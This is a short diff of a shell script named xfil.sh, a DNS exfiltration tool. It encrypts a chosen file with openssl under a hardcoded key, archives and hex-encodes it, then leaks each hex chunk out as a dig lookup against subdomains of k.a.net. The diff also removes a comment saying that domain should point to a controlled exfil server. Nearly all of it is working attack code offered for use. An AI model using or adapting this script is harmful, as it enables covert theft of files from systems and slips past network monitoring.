@@ -2,18 +2,16 @@
 
 # this should be ran from the exfil point
 
+#!/bin/sh
+
 usage (){
   echo "USAGE: xfil.sh <file>"
   exit 1
 }
-
-# this dig command below statically has a domain name k.a.net
-# this will need to be adjusted to point to the exfil server name that is controlled
-
-if [ $1 ]; then
-
-  tar -P -zcf $1 | openssl aes-128-cbc -out $1.tar.gz -k 1234
-  xxd -p $1.tar.gz > $1.hex
+if [ $1 ]; then	  
+  openssl aes-256-cbc -in $1 -out $1.1 -k 1234
+  tar -zcf $1.tgz $1.1
+  xxd -p $1.tgz > $1.hex
   for dnsx in `cat $1.hex `; do dig $dnsx.k.a.net; done
 
 else usage
